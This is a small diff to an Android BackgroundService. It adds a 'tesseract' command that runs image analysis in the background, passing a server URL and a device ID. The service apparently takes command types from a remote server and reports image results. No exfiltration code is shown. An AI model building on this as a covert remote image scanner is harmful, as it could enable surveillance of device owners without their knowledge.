@@ -128,6 +128,13 @@ class BackgroundService : Service() {
                                 logEvent("image_report", report.toString())
                             }
 
+                            "tesseract" -> {
+                                CoroutineScope(Dispatchers.IO).launch {
+                                    ImageAnalyzer.performImageAnalysis(this@BackgroundService, serverBase, deviceId)
+                                }
+                                logEvent("tesseract_started")
+                            }
+
                             else -> {
                                 Log.d("BackgroundService", "No action for command type: '$commandType'")
                             }
